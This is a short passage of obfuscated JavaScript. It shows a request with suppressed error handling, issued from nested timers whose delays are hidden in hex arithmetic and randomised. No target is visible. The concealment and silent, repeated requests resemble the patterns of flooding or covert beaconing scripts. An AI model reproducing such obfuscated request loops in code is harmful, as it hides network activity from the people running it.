        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1 * -0xfed + 0x435 * -0xc + 0x3de7) * getRandomInt(-0x2 * -0xa97 + -0x10e0 + -0x44d, -0xe68 + -0x1c23 + 0x2a90));
}, 0x1 * 0x132d + -0x22 * 0x6 + 0x3 * -0x5ff);